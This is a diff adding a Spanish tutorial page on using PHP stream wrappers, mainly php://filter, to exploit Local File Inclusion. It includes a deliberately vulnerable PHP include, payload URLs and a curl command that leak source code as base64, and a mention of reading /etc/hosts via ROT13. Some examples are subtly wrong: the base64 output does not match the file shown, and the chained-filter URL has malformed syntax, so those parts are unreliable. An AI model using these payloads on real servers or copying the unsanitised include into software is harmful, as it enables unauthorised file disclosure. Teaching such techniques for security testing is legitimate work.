@@ -1,0 +1,64 @@
+---
+title: 'Wrappers'
+publishedAt: '2024-11-15'
+group: 'tecnicas_pentesting'
+groupOrder: 1
+---
+
+# Wrappers
+
+Un wrapper es una especie de envoltura que le dice al Stream (secuencia, petición, entrada/salida de datos) como actuar.
+Cuando tenemos una vulnerabilidad de [Local File Inclusion](/local-file-inclusion) podemos ver más cosas que solo cargando el archivo.
+
+Algunos de los wrappers son:
+
+* php://filter
+* zip://
+* data://
+* php://input
+* expect://
+
+## php://filter
+
+Con este wrapper podemos codificar el archivo para extraer más información de la que ofrece de primeras como, por ejemplo, comentarios o el código fuente directamente.
+
+Si tenemos el archivo example.php
+
+```php
+<?php
+    $filename = $_GET['file'];
+    include($filename);
+?>
+```
+
+y el archivo example2.php
+
+```php
+<?php
+    // Esto es un comentario
+
+    echo "Aqui no hay nada";
+?>
+```
+
+Cuando llamamos a [http://localhost/example.php?file=example2.php](http://localhost/example.php?file=example2.php), lo único que nos aparece es
+
+![Captura del resultado](/images/wrappers-1.png)
+
+Pero en el momento que utilizamos el wrapper [http://localhost/example.php?file=php://filter/convert.base64-encode/resource=example2.php](http://localhost/example.php?file=php://filter/convert.base64-encode/resource=example2.php), nos devuelve todo el archivo en base64
+
+```
+PD9waHAKCi8vIENvbWVudGFyaW8gc2VjcmV0bwoKZWNobyAiQXF1w60gbm8gaGF5IG5hZGEiOwoKPz4K
+```
+
+Lo decodificamos
+
+```bash
+curl -s "http://localhost/example.php?file=php://filter/convert.base64-encode/resource=example2.php" | base64 -d
+```
+
+y nos devuelve el código con los comentarios y todo.
+
+Se pueden concatenar varios wrappers con un&nbsp;&nbsp;<kbd>pipe |</kbd>&nbsp;&nbsp; con lo que (ejemplo tonto) podríamos codificar dos veces en base64 con [http://localhost/example.php?file=php://filter/convert.base64-encode/resource|convert.base64-encode/resource=example2.php](http://localhost/example.php?file=php://filter/convert.base64-encode/resource|convert.base64-encode/resource=example2.php).
+
+Y también podemos aplicar ROT13 para archivos como /etc/hosts con php://filter/read=string.rot13/resource=\<archivo\>
